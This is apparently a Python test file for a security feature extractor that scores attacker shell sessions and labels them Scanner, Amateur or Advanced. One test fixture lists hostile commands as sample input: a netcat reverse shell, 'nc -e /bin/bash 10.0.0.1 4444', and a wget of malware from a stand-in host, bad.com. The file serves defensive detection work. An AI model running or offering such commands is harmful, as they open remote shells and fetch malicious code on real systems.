"""
Tests for src/features.py
"""

import pandas as pd
from src.features import shannon_entropy, extract_features, derive_label, build_feature_matrix

def test_shannon_entropy_empty():
    assert shannon_entropy("") == 0.0

def test_shannon_entropy_uniform():
    assert shannon_entropy("aaaa") == 0.0

def test_shannon_entropy_varied():
    # 'abcd' has 4 distinct chars, so entropy is log2(4) = 2.0
    assert shannon_entropy("abcd") == 2.0

def test_extract_features_all_15_present():
    session = {"commands": ["ls"], "duration_sec": 10.0}
    features = extract_features(session)
    expected_keys = [
        "command_count", "command_diversity", "unique_commands", "session_duration",
        "download_attempts", "file_upload_count", "failed_auth_attempts", "inter_command_delay_avg",
        "privilege_escalation", "lateral_movement", "command_length_avg", "entropy_score",
        "base64_presence", "known_malicious_signatures", "threat_db_matches"
    ]
    for key in expected_keys:
        assert key in features

def test_extract_features_scanner():
    session = {"commands": ["whoami", "uname"], "duration_sec": 2.0}
    features = extract_features(session)
    assert features["privilege_escalation"] == 0
    assert features["lateral_movement"] == 0
    assert features["inter_command_delay_avg"] == 2.0

def test_extract_features_advanced():
    session = {"commands": ["sudo su", "nc -e /bin/bash 10.0.0.1 4444", "wget http://bad.com/malware"]}
    features = extract_features(session)
    assert features["privilege_escalation"] == 1
    assert features["lateral_movement"] == 1
    assert features["known_malicious_signatures"] >= 2

def test_derive_label_scanner():
    assert derive_label(1.0) == "Scanner"

def test_derive_label_amateur():
    assert derive_label(2.0) == "Amateur"

def test_derive_label_advanced():
    assert derive_label(3.5) == "Advanced"

def test_build_feature_matrix_shape():
    sessions = [{"commands": ["ls"]}, {"commands": ["pwd"]}, {"commands": ["whoami"]}]
    df = build_feature_matrix(sessions)
    assert df.shape[0] == 3
    # 15 features + 1 session_id = 16 columns
    assert df.shape[1] == 16
